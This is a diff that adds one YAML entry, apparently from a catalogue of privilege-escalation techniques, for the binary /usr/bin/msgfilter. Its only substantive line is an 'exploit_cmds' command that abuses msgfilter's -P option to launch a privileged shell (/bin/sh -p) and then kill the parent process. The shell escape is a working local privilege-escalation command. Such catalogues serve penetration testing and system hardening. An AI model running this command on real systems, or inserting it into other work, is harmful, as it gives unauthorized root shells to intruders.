@@ -1,0 +1,4 @@
+name: msgfilter
+binary_path: /usr/bin/msgfilter
+exploit_cmds:
+- echo x | /usr/bin/msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
